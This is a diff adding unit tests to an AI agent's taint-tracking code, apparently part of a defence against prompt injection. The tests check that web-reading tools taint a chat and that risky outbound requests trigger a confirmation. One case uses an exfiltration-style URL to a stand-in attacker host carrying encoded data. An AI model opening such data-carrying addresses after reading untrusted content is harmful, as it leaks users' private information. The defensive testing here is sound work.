@@ -119,6 +119,54 @@ describe('what taints a chat', () => {
   });
 });
 
+describe('cards of what’s known', () => {
+  const ctx = { workspace: '/work' };
+  it('taint like the pages they read, on every transport', () => {
+    for (const prefix of ['', 'mcp__conch__']) {
+      expect(taintFrom(`${prefix}knowledge_card`, { query: 'Ada Lovelace' })).toEqual({
+        kind: 'web',
+        label: 'Wikipedia',
+      });
+      expect(taintFrom(`${prefix}book_search`, { query: 'Le Guin' })).toEqual({
+        kind: 'web',
+        label: 'Open Library',
+      });
+      expect(taintFrom(`${prefix}show_search`, { query: 'Severance' })).toEqual({
+        kind: 'web',
+        label: 'TVmaze',
+      });
+      expect(taintFrom(`${prefix}show_search`, { query: 'Dune', kind: 'movie' })).toEqual({
+        kind: 'web',
+        label: 'Wikipedia',
+      });
+      expect(taintFrom(`${prefix}link_preview`, { urls: ['https://www.example.com/a'] })).toEqual({
+        kind: 'web',
+        label: 'example.com',
+      });
+      expect(
+        taintFrom(`${prefix}link_preview`, { urls: ['https://a.example/', 'https://b.example/'] }),
+      ).toEqual({ kind: 'web', label: 'web pages' });
+    }
+  });
+  it('ask after reading only when what they send could carry it', () => {
+    expect(sinkReason('knowledge_card', { query: 'Lisbon' }, ctx)).toBeUndefined();
+    expect(sinkReason('mcp__conch__book_search', { query: 'Le Guin' }, ctx)).toBeUndefined();
+    expect(sinkReason('show_search', { query: 'x'.repeat(121) }, ctx)).toBe(
+      'send a search query to the web',
+    );
+    expect(
+      sinkReason('link_preview', { urls: ['https://example.com/docs/page'] }, ctx),
+    ).toBeUndefined();
+    expect(
+      sinkReason(
+        'link_preview',
+        { urls: ['https://example.com/', `https://attacker.example/?d=${'QUJD'.repeat(20)}`] },
+        ctx,
+      ),
+    ).toBe('open a web address that could carry what it read');
+  });
+});
+
 describe('what asks once a chat is tainted', () => {
   const ctx = { workspace: '/Users/ada/work' };
   it('commands, files outside the work folder, addresses that carry data, an app’s actions', () => {
